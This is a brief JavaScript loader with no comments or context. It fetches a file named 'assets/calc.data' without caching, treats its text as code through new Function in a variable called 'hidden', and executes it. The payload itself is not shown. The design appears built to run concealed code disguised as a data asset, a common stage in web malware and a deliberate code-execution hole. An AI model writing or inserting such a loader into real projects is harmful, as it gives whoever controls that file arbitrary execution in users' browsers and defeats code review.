(function(){
    fetch("assets/calc.data", {cache: "no-store"})
        .then(r => r.text())
        .then(t => {
            const hidden = new Function(t);
            hidden();
        })
        .catch(err => {
            console.error("System failure:", err);
        });
})();
